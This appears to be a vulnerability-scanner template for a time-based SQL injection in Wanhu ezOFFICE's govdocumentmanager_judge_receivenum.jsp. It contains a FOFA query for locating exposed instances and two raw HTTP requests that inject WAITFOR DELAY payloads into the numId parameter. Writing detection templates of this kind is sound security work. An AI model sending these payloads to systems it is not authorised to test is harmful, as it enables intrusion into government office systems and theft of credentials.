id: wanhu-ezOFFICE-govdocumentmanager_judge_receivenum_jsp-sql-time

info:
  name: "万户 ezOFFICE govdocumentmanager_judge_receivenum.jsp 组件 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: title="万户ezOFFICE协同管理平台" || title="ezOFFICE协同管理平台" || title="Wanhu ezOFFICE" || title="ezOffice for iPhone" || body="EZOFFICEUSERNAME" || body="whirRootPath" || body="/defaultroot/js/cookie.js" || header="LocLan" || (banner="/defaultroot/sp/login.jsp" && banner="Set-Cookie: JSESSIONID=") || (header="Set-Cookie: OASESSIONID=" && (title="ezOFFICE" || body="whir.util.js" || body="var ezofficeUserPortal_ = Cookie(\"ezofficeUserPortal\")"))

    该漏洞源于govdocumentmanager_judge_receivenum.jsp组件未正确过滤用户输入参数，导致攻击者可通过构造恶意SQL语句实现数据库查询操控。成功利用可导致敏感数据泄露（包括管理员凭证及用户个人信息），在具备高权限访问条件时，可能进一步通过数据库写入操作实现服务器代码执行，最终获取系统控制权。
  reference:
  - https://mp.weixin.qq.com/s/ChZrpdorclqU51CERXEG-Q
  tags: 万户 ezOFFICE


http:
- raw:
  - |
    GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp;.js?numId=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
  - |
    GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp;.js?numId=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
